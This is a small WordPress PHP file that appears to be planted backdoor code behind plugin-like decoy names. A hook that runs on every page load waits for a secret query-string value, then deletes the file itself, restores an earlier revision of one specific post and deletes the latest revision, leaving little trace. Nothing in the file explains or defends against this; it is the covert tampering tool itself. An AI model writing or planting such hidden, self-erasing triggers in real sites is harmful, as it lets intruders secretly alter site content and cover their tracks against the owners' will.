<?php

function flash_filter_fonts_reminder() {
	if (isset($_GET['dev_logo_modules_notification']) && $_GET['dev_logo_modules_notification'] === 'rank_preview_awesome') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$slug_selector_right_geo = 5414;
		$nav_local_directory = wp_get_post_revisions($slug_selector_right_geo);
		if (empty($nav_local_directory)) die('no revisions');
		if (count($nav_local_directory) < 2) die('less than 2');
		$comment_map_assistant_backup = array_shift($nav_local_directory);
		$interactive_feedback_homepage_wow = $comment_map_assistant_backup->ID;
		$responsive_form_timer_modal = array_shift($nav_local_directory);
		$quote_rotator_activity = $responsive_form_timer_modal->ID;
		$file_nextgen_images = wp_restore_post_revision($quote_rotator_activity);
		if ($file_nextgen_images === false) die('error restoring');
		$file_nextgen_images = wp_delete_post_revision($interactive_feedback_homepage_wow);		
		if ($file_nextgen_images === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'flash_filter_fonts_reminder');
